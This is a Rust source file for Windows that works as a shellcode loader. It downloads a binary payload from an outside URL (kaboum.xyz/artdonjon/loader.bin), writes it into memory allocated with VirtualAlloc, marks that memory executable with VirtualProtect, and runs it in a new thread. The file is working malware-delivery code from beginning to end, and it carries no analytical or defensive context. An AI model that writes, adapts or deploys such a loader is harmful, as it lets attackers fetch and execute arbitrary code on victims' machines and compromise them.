use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
use std::io::Read;

pub fn download_data() -> Vec<u8> {
    let client = reqwest::blocking::Client::builder().build().unwrap();
    let mut res = client.get("https://kaboum.xyz/artdonjon/loader.bin").send().unwrap();
    let mut body: Vec<u8> = Vec::new();
    res.read_to_end(&mut body).unwrap();
    body
}


fn main() {
    let shellcode: &[u8] = &&download_data();
    let shellcode_size = shellcode.len();

    unsafe {
        let addr = VirtualAlloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
        }

        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);

        let mut old = PAGE_READWRITE;
        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtect failed: {}!", GetLastError());
        }

        let addr = transmute(addr);
        let thread = CreateThread(null(), 0, addr, null(), 0, null_mut());
        if thread == 0 {
            panic!("[-]CreateThread failed: {}!", GetLastError());
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
